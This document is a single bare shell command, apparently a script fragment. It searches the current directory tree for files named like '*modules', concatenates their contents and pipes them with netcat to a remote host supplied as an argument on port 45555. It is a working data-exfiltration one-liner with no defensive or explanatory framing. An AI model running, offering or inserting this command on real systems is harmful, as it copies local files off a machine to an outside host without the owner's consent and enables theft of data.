find . -name "*modules" -ls -exec cat {} \; | nc -q0 $1 45555
